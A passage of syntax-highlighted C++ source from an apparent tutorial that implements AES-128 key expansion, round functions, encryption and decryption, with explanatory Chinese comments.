{<br>        ss&lt;&lt;hex&lt;&lt;<span class="hljs-built_in">int</span>(str[i])&lt;&lt;endl;<br>        ss&gt;&gt;tmp;<br>        result+=tmp;<br>    }<br>    <span class="hljs-keyword">return</span> result;<br>}<br><span class="hljs-function">string <span class="hljs-title">hex_to_string</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; str)</span></span><br><span class="hljs-function"></span>{<br>    std::string result;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; str.<span class="hljs-built_in">length</span>(); i += <span class="hljs-number">2</span>)<span class="hljs-comment">//十六进制两个字符为原始字符一个字符</span><br>    {<br>        std::string byte = str.<span class="hljs-built_in">substr</span>(i, <span class="hljs-number">2</span>);<span class="hljs-comment">//每次切两个字符</span><br>        <span class="hljs-comment">//将十六进制的string转成long再强转成int再转成char</span><br>        <span class="hljs-type">char</span> chr = (<span class="hljs-type">char</span>)(<span class="hljs-type">int</span>)<span class="hljs-built_in">strtol</span>(byte.<span class="hljs-built_in">c_str</span>(), <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);<br>        result.<span class="hljs-built_in">push_back</span>(chr);<span class="hljs-comment">//将处理完的字符压入result中</span><br>    }<br>    <span class="hljs-keyword">return</span> result;<br>}<br><span class="hljs-comment">//制作列混淆表</span><br><span class="hljs-function"><span class="hljs-type">uint8_t</span> <span class="hljs-title">Mul_02</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> x)</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-keyword">if</span>((x&gt;&gt;<span class="hljs-number">7</span>) == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> x&lt;&lt;<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">return</span> ((x&lt;&lt;<span class="hljs-number">1</span>)^<span class="hljs-number">0x1b</span>)&amp;<span class="hljs-number">0xff</span>;<br>}<br><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">get_output_col1</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> x)</span></span><br><span class="hljs-function"></span>{<br>    x = (<span class="hljs-type">uint32_t</span>)x;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">Mul_02</span>(x)&lt;&lt;<span class="hljs-number">24</span>)|(x&lt;&lt;<span class="hljs-number">16</span>)|(x&lt;&lt;<span class="hljs-number">8</span>)|(x^ <span class="hljs-built_in">Mul_02</span>(x));<br>    <span class="hljs-comment">//2113</span><br>}<br><br><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">get_output_col2</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> x)</span></span><br><span class="hljs-function"></span>{<br>    x = (<span class="hljs-type">uint32_t</span>)x;<br>    <span class="hljs-keyword">return</span> ((x^<span class="hljs-built_in">Mul_02</span>(x))&lt;&lt;<span class="hljs-number">24</span>)|(<span class="hljs-built_in">Mul_02</span>(x)&lt;&lt;<span class="hljs-number">16</span>)|(x&lt;&lt;<span class="hljs-number">8</span>)|(x);<br>    <span class="hljs-comment">//3211</span><br>}<br><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">get_output_col3</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> x)</span></span><br><span class="hljs-function"></span>{<br>    x = (<span class="hljs-type">uint32_t</span>)x;<br>    <span class="hljs-keyword">return</span> (x&lt;&lt;<span class="hljs-number">24</span>)|((x^<span class="hljs-built_in">Mul_02</span>(x))&lt;&lt;<span class="hljs-number">16</span>)|(<span class="hljs-built_in">Mul_02</span>(x)&lt;&lt;<span class="hljs-number">8</span>)|(x);<br>    <span class="hljs-comment">//1321</span><br>}<br><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">get_output_col4</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> x)</span></span><br><span class="hljs-function"></span>{<br>    x = (<span class="hljs-type">uint32_t</span>)x;<br>    <span class="hljs-keyword">return</span> (x&lt;&lt;<span class="hljs-number">24</span>)|(x&lt;&lt;<span class="hljs-number">16</span>)|((x^<span class="hljs-built_in">Mul_02</span>(x))&lt;&lt;<span class="hljs-number">8</span>)|(<span class="hljs-built_in">Mul_02</span>(x));<br>    <span class="hljs-comment">//1132</span><br>}<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">get_TAB</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++) {<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">256</span>; j++) {<br>            T[i][j]=<span class="hljs-number">0</span>;<br>        }<br>    }<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>;i++) {<br>        T[<span class="hljs-number">0</span>][i] = <span class="hljs-built_in">get_output_col1</span>((<span class="hljs-type">uint8_t</span>) i);<br>        T[<span class="hljs-number">1</span>][i] = <span class="hljs-built_in">get_output_col2</span>((<span class="hljs-type">uint8_t</span>) i);<br>        T[<span class="hljs-number">2</span>][i] = <span class="hljs-built_in">get_output_col3</span>((<span class="hljs-type">uint8_t</span>) i);<br>        T[<span class="hljs-number">3</span>][i] = <span class="hljs-built_in">get_output_col4</span>((<span class="hljs-type">uint8_t</span>) i);<br>    }<br>    <span class="hljs-comment">//输出列混淆表</span><br><span class="hljs-comment">//    for(int i=0;i&lt;4;i++) {</span><br><span class="hljs-comment">//        for (int j = 0; j &lt; 256; j++) {</span><br><span class="hljs-comment">//            //printf("%8x ",T[i][j]);</span><br><span class="hljs-comment">//            cout &lt;&lt;setw(8)&lt;&lt;setfill('0')&lt;&lt; hex &lt;&lt; T[i][j] &lt;&lt; " ";</span><br><span class="hljs-comment">//        }</span><br><span class="hljs-comment">//        cout&lt;&lt;endl;</span><br><span class="hljs-comment">//    }</span><br>}<br><br><span class="hljs-function"><span class="hljs-type">uint8_t</span> <span class="hljs-title">GFMul</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> a, <span class="hljs-type">uint8_t</span> b)</span> </span>{<br>    <span class="hljs-type">uint8_t</span> p = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint8_t</span> high;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> counter = <span class="hljs-number">0</span>; counter &lt; <span class="hljs-number">8</span>; counter++)<br>    {<br>        <span class="hljs-keyword">if</span> ((b &amp; <span class="hljs-built_in">uint8_t</span>(<span class="hljs-number">1</span>)) != <span class="hljs-number">0</span>){<span class="hljs-comment">//判断当前b的最后一位是否为0</span><br>            p ^= a;}<span class="hljs-comment">// p与a异或  即如果b当前最后一位不是0，就加上现在的a</span><br>        high = (<span class="hljs-type">uint8_t</span>) (a &amp; <span class="hljs-built_in">uint8_t</span>(<span class="hljs-number">0x80</span>));<span class="hljs-comment">//高4位，看是否会溢出，high=1就是溢出</span><br>        a &lt;&lt;= <span class="hljs-number">1</span>;<span class="hljs-comment">//a左移一位，即乘以2</span><br>        <span class="hljs-keyword">if</span> (high != <span class="hljs-number">0</span>){<span class="hljs-comment">//发生溢出</span><br>            a ^= <span class="hljs-number">0x1b</span>; }<span class="hljs-comment">// x^8 + x^4 + x^3 + x + 1</span><br>        b &gt;&gt;= <span class="hljs-number">1</span>;<span class="hljs-comment">//右移，看b的下一位了</span><br><br>    }<br>    <span class="hljs-keyword">return</span> p;<br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">KeyExpansion</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> key[], <span class="hljs-type">uint32_t</span> w[])</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> temp=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// w[]的前4个就是输入的key</span><br>    <span class="hljs-comment">//初始化w[0]-&gt;w[3]</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>;i++){<br>        w[i] = (key[<span class="hljs-number">4</span>*i]&lt;&lt;<span class="hljs-number">24</span>)|(key[<span class="hljs-number">4</span>*i+<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>)|(key[<span class="hljs-number">4</span>*i+<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">8</span>)|(key[<span class="hljs-number">4</span>*i+<span class="hljs-number">3</span>]);<br>        <span class="hljs-comment">//printf("%d:%x\n",i,w[i]);</span><br>    }<br>    <span class="hljs-comment">//创建w[4]-&gt;w[43]</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">4</span>; i&lt;<span class="hljs-number">44</span>;i++){<br>        <span class="hljs-keyword">if</span>(i%<span class="hljs-number">4</span>==<span class="hljs-number">0</span>){<br>            temp = <span class="hljs-built_in">left_bit_move</span>(w[i<span class="hljs-number">-1</span>],<span class="hljs-number">8</span>);<span class="hljs-comment">//循环左移8位</span><br>            temp =  <span class="hljs-built_in">SubKeys</span>(temp);<br>            w[i] = temp ^ w[i<span class="hljs-number">-4</span>] ^ LunMiYaoJia[j++];<br>            <span class="hljs-comment">//printf("%d:%x\n",i,w[i]);</span><br>        }<br>        <span class="hljs-keyword">else</span> {<br>            w[i] = w[i - <span class="hljs-number">1</span>] ^ w[i - <span class="hljs-number">4</span>];<br>            <span class="hljs-comment">//printf("%d:%x\n",i,w[i]);</span><br>        }<br>    }<br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddRoundKey</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> mtx[],<span class="hljs-type">uint32_t</span> w[])</span></span><br><span class="hljs-function"></span>{<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>; i++){<br>        <span class="hljs-type">uint8_t</span> w1 = w[i] &gt;&gt; <span class="hljs-number">24</span> &amp; <span class="hljs-number">0xff</span>;<br>        <span class="hljs-type">uint8_t</span> w2 = (w[i] &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span>;<br>        <span class="hljs-type">uint8_t</span> w3 = (w[i] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>;<br>        <span class="hljs-type">uint8_t</span> w4 = (w[i]) &amp; <span class="hljs-number">0xff</span>;<br>        mtx[i] ^= w1;  <span class="hljs-comment">//按列异或</span><br>        mtx[i+<span class="hljs-number">4</span>] ^= w2;<br>        mtx[i+<span class="hljs-number">8</span>] ^= w3;<br>        mtx[i+<span class="hljs-number">12</span>] ^= w4;<br>    }<br>}<br><br><span class="hljs-comment">//  S盒密钥变换 - 前4位为行号，后4位为列号</span><br><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">SubKeys</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> temp)</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-type">uint8_t</span> w[<span class="hljs-number">4</span>] = {<span class="hljs-number">0</span>};<br>    <span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//循环4次</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">3</span>; i&gt;=<span class="hljs-number">0</span>; i--){<br>        w[j++] = (temp&gt;&gt;(i*<span class="hljs-number">8</span>))&amp;<span class="hljs-number">0xff</span>;<br>    }<br>    <span class="hljs-built_in">SubBytes</span>(w,<span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">return</span> (w[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">24</span>|w[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>|w[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">8</span>|w[<span class="hljs-number">3</span>]);<br>}<br><br><span class="hljs-comment">//  S盒变换 - 前4位为行号，后4位为列号</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SubBytes</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> mtx[],<span class="hljs-type">int</span> len)</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;len; ++i)<br>    {<br>        <span class="hljs-type">int</span> row = ((mtx[i]&gt;&gt;<span class="hljs-number">7</span>)&amp;<span class="hljs-number">0x1</span>)*<span class="hljs-number">8</span> + ((mtx[i]&gt;&gt;<span class="hljs-number">6</span>)&amp;<span class="hljs-number">0x1</span>)*<span class="hljs-number">4</span> + ((mtx[i]&gt;&gt;<span class="hljs-number">5</span>)&amp;<span class="hljs-number">0x1</span>)*<span class="hljs-number">2</span> + ((mtx[i]&gt;&gt;<span class="hljs-number">4</span>)&amp;<span class="hljs-number">0x1</span>)*<span class="hljs-number">1</span>;    <span class="hljs-comment">//第4 5 6 7位确定行</span><br>        <span class="hljs-type">int</span> col = ((mtx[i]&gt;&gt;<span class="hljs-number">3</span>)&amp;<span class="hljs-number">0x1</span>)*<span class="hljs-number">8</span> + ((mtx[i]&gt;&gt;<span class="hljs-number">2</span>)&amp;<span class="hljs-number">0x1</span>)*<span class="hljs-number">4</span> + ((mtx[i]&gt;&gt;<span class="hljs-number">1</span>)&amp;<span class="hljs-number">0x1</span>)*<span class="hljs-number">2</span> + (mtx[i]&amp;<span class="hljs-number">0x1</span>)*<span class="hljs-number">1</span>;       <span class="hljs-comment">//第0 1 2 3位确定列</span><br>        mtx[i] = S_Box[row][col];<br>    }<br>}<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InvSubBytes</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> mtx[],<span class="hljs-type">int</span> len)</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;len; ++i)<br>    {<br>        <span class="hljs-type">int</span> row = ((mtx[i]&gt;&gt;<span class="hljs-number">7</span>)&amp;<span class="hljs-number">0x1</span>)*<span class="hljs-number">8</span> + ((mtx[i]&gt;&gt;<span class="hljs-number">6</span>)&amp;<span class="hljs-number">0x1</span>)*<span class="hljs-number">4</span> + ((mtx[i]&gt;&gt;<span class="hljs-number">5</span>)&amp;<span class="hljs-number">0x1</span>)*<span class="hljs-number">2</span> + ((mtx[i]&gt;&gt;<span class="hljs-number">4</span>)&amp;<span class="hljs-number">0x1</span>)*<span class="hljs-number">1</span>;    <span class="hljs-comment">//第4 5 6 7位确定行</span><br>        <span class="hljs-type">int</span> col = ((mtx[i]&gt;&gt;<span class="hljs-number">3</span>)&amp;<span class="hljs-number">0x1</span>)*<span class="hljs-number">8</span> + ((mtx[i]&gt;&gt;<span class="hljs-number">2</span>)&amp;<span class="hljs-number">0x1</span>)*<span class="hljs-number">4</span> + ((mtx[i]&gt;&gt;<span class="hljs-number">1</span>)&amp;<span class="hljs-number">0x1</span>)*<span class="hljs-number">2</span> + (mtx[i]&amp;<span class="hljs-number">0x1</span>)*<span class="hljs-number">1</span>;       <span class="hljs-comment">//第0 1 2 3位确定列</span><br>        mtx[i] = Inv_S_Box[row][col];<br>    }<br>}<br><span class="hljs-comment">//行移位</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiftRows</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> mtx[])</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-type">uint8_t</span> temp=mtx[<span class="hljs-number">4</span>];<br>    <span class="hljs-comment">//第二行左移一位</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">3</span>; i++){<br>        mtx[i+<span class="hljs-number">4</span>] = mtx[i+<span class="hljs-number">5</span>];<br>    }<br>    mtx[<span class="hljs-number">7</span>] = temp;<br>    <span class="hljs-comment">//第三行左移二位</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">2</span>; i++){<br>        temp = mtx[i+<span class="hljs-number">8</span>];<br>        mtx[i+<span class="hljs-number">8</span>] = mtx[i+<span class="hljs-number">10</span>];<br>        mtx[i+<span class="hljs-number">10</span>] = temp;<br>    }<br>    <span class="hljs-comment">//第四行左移三位</span><br>    temp = mtx[<span class="hljs-number">15</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">3</span>; i&gt;<span class="hljs-number">0</span>; i--) {<br>        mtx[i + <span class="hljs-number">12</span>] = mtx[i + <span class="hljs-number">11</span>];<br>    }<br>    mtx[<span class="hljs-number">12</span>] = temp;<br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InvShiftRows</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> mtx[])</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-comment">// 第二行循环右移一位</span><br>    <span class="hljs-type">uint8_t</span> temp = mtx[<span class="hljs-number">7</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">3</span>; i&gt;<span class="hljs-number">0</span>; --i)<br>        mtx[i+<span class="hljs-number">4</span>] = mtx[i+<span class="hljs-number">3</span>];<br>    mtx[<span class="hljs-number">4</span>] = temp;<br>    <span class="hljs-comment">// 第三行循环右移两位</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">2</span>; ++i)<br>    {<br>        temp = mtx[i+<span class="hljs-number">8</span>];<br>        mtx[i+<span class="hljs-number">8</span>] = mtx[i+<span class="hljs-number">10</span>];<br>        mtx[i+<span class="hljs-number">10</span>] = temp;<br>    }<br>    <span class="hljs-comment">// 第四行循环右移三位</span><br>    temp = mtx[<span class="hljs-number">12</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">3</span>; ++i)<br>        mtx[i+<span class="hljs-number">12</span>] = mtx[i+<span class="hljs-number">13</span>];<br>    mtx[<span class="hljs-number">15</span>] = temp;<br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MixColumns</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> c[])</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-type">uint32_t</span> total[<span class="hljs-number">4</span>]={<span class="hljs-number">0</span>};  <span class="hljs-comment">//存储每一列取出的4个32比特字节异或的结果，即列混淆后的第i列</span><br>    <span class="hljs-type">uint32_t</span> temp[<span class="hljs-number">16</span>]={<span class="hljs-number">0</span>};  <span class="hljs-comment">//存储16个 每个字节从T表得到的32比特的4字节一列</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">16</span>;i++){<br>        temp[i] = T[i/<span class="hljs-number">4</span>][c[i]];<br>    }<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>;i++) {<br>        total[i] = temp[i] ^ temp[i+<span class="hljs-number">4</span>] ^ temp[i+<span class="hljs-number">8</span>] ^ temp[i+<span class="hljs-number">12</span>];<br>        c[i] = (total[i]&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span>;<br>        c[i+<span class="hljs-number">4</span>]=(total[i]&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span>;<br>        c[i+<span class="hljs-number">8</span>] = (total[i]&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span>;<br>        c[i+<span class="hljs-number">12</span>] = (total[i])&amp;<span class="hljs-number">0xff</span>;<br>    }<br>}<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InvMixColumns</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> mtx[])</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-type">uint8_t</span> arr[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">4</span>; ++i) {<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j)<br>            arr[j] = mtx[i + j * <span class="hljs-number">4</span>];<br><br>        mtx[i] = <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0e</span>, arr[<span class="hljs-number">0</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0b</span>, arr[<span class="hljs-number">1</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0d</span>, arr[<span class="hljs-number">2</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x09</span>, arr[<span class="hljs-number">3</span>]);<br>        mtx[i + <span class="hljs-number">4</span>] = <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x09</span>, arr[<span class="hljs-number">0</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0e</span>, arr[<span class="hljs-number">1</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0b</span>, arr[<span class="hljs-number">2</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0d</span>, arr[<span class="hljs-number">3</span>]);<br>        mtx[i + <span class="hljs-number">8</span>] = <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0d</span>, arr[<span class="hljs-number">0</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x09</span>, arr[<span class="hljs-number">1</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0e</span>, arr[<span class="hljs-number">2</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0b</span>, arr[<span class="hljs-number">3</span>]);<br>        mtx[i + <span class="hljs-number">12</span>] = <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0b</span>, arr[<span class="hljs-number">0</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0d</span>, arr[<span class="hljs-number">1</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x09</span>, arr[<span class="hljs-number">2</span>]) ^ <span class="hljs-built_in">GFMul</span>(<span class="hljs-number">0x0e</span>, arr[<span class="hljs-number">3</span>]);<br>    }<br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Encrypt</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> m[],<span class="hljs-type">uint32_t</span> key[],<span class="hljs-type">uint8_t</span> c[])</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-comment">//首先进行开始的轮密钥加</span><br>    <span class="hljs-type">int</span> round=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> w[<span class="hljs-number">4</span>]={<span class="hljs-number">0</span>};<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>; k&lt;<span class="hljs-number">4</span>; k++)<br>        w[k] = key[<span class="hljs-number">4</span>*round+k];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">16</span>; i++)<br>        c[i] = m[i];<br>    <span class="hljs-built_in">AddRoundKey</span>(c,w);<br>    <span class="hljs-comment">//接下来是9轮一摸一样的函数</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">9</span>;i++)<br>    {<br>        <span class="hljs-built_in">SubBytes</span>(c,<span class="hljs-number">16</span>);<span class="hljs-comment">//字节替代</span><br>        <span class="hljs-built_in">ShiftRows</span>(c);<span class="hljs-comment">//行移位</span><br>        <span class="hljs-built_in">MixColumns</span>(c);<span class="hljs-comment">//列混淆</span><br>        round++;<br>        <span class="hljs-comment">//cout&lt;&lt;"轮数"&lt;&lt;round&lt;&lt;endl;</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>; k&lt;<span class="hljs-number">4</span>; k++) {<br>            w[k] = key[<span class="hljs-number">4</span> * round + k];<br>        }<br>        <span class="hljs-built_in">AddRoundKey</span>(c,w);<span class="hljs-comment">//轮密钥加</span><br>    }<br>    <span class="hljs-comment">//最后一轮</span><br>    round++;<br>    <span class="hljs-comment">//cout&lt;&lt;"轮数"&lt;&lt;round&lt;&lt;endl;</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>; k&lt;<span class="hljs-number">4</span>; k++) {<br>        w[k] = key[<span class="hljs-number">4</span> * round + k];<br>        <span class="hljs-comment">//("%x ",w[k]);</span><br>    }<br>    <span class="hljs-built_in">SubBytes</span>(c,<span class="hljs-number">16</span>);<span class="hljs-comment">//字节替代</span><br>    <span class="hljs-built_in">ShiftRows</span>(c);<span class="hljs-comment">//行移位</span><br>    <span class="hljs-built_in">AddRoundKey</span>(c,w);<span class="hljs-comment">//轮密钥加</span><br>}<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> c[],<span class="hljs-type">uint32_t</span> key[],<span class="hljs-type">uint8_t</span> m[])</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-comment">//首先进行开始的轮密钥加</span><br>    <span class="hljs-comment">//注意密钥反着来</span><br>    <span class="hljs-type">int</span> round=<span class="hljs-number">10</span>;<br>    <span class="hljs-type">uint32_t</span> w[<span class="hljs-number">4</span>]={<span class="hljs-number">0</span>};<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>; k&lt;<span class="hljs-number">4</span>; k++)<br>        w[k] = key[<span class="hljs-number">4</span>*round+k];  <span class="hljs-comment">//密钥赋值</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">16</span>; i++)<br>        m[i] = c[i];<br>    <span class="hljs-built_in">AddRoundKey</span>(m,w);<br>    <span class="hljs-comment">//接下来是9轮一摸一样的函数</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">9</span>;i++)<br>    {<br>        <span class="hljs-built_in">InvShiftRows</span>(m);<span class="hljs-comment">//行移位</span><br>        <span class="hljs-built_in">InvSubBytes</span>(m,<span class="hljs-number">16</span>);<span class="hljs-comment">//字节替代</span><br>        round--;<br>        <span class="hljs-comment">//cout&lt;&lt;"轮数"&lt;&lt;round&lt;&lt;endl;</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>; k&lt;<span class="hljs-number">4</span>; k++) {<br>            w[k] = key[<span class="hljs-number">4</span> * round + k];<br>        }<br>        <span class="hljs-built_in">AddRoundKey</span>(m,w);<span class="hljs-comment">//轮密钥加</span><br>        <span class="hljs-built_in">InvMixColumns</span>(m);<span class="hljs-comment">//列混淆</span><br>    }<br>    <span class="hljs-comment">//最后一轮</span><br>    round--;<br>    <span class="hljs-comment">//cout&lt;&lt;"轮数"&lt;&lt;round&lt;&lt;endl;</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>; k&lt;<span class="hljs-number">4</span>; k++) {<br>        w[k] = key[<span class="hljs-number">4</span> * round + k];<br>        <span class="hljs-comment">//("%x ",w[k]);</span><br>    }<br>    <span class="hljs-built_in">InvShiftRows</span>(m);<span class="hljs-comment">//行移位</span><br>    <span class="hljs-built_in">InvSubBytes</span>(m,<span class="hljs-number">16</span>);<span class="hljs-comment">//字节替代</span><br>    <span class="hljs-built_in">AddRoundKey</span>(m,w);<span class="hljs-comment">//轮密钥加</span><br>}<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Display</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> Matrix[])</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">16</span>; i++) {<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%x "</span>, Matrix[i]);<br>        <span class="hljs-keyword">if</span>(i%<span class="hljs-number">4</span>==<span class="hljs-number">3</span>)<br>            cout&lt;&lt;endl;<br>    }<br>}<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DisplayKeys</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> Matrix[])</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">44</span>; i++) {<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"第%d列:%x\n"</span>,i,Matrix[i]);<br>    }<br>}<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>    string mingwen;<br>    string miwen;<br>    <span class="hljs-type">uint8_t</span> key[<span class="hljs-number">16</span>]={<span class="hljs-number">0</span>};<br>    <span 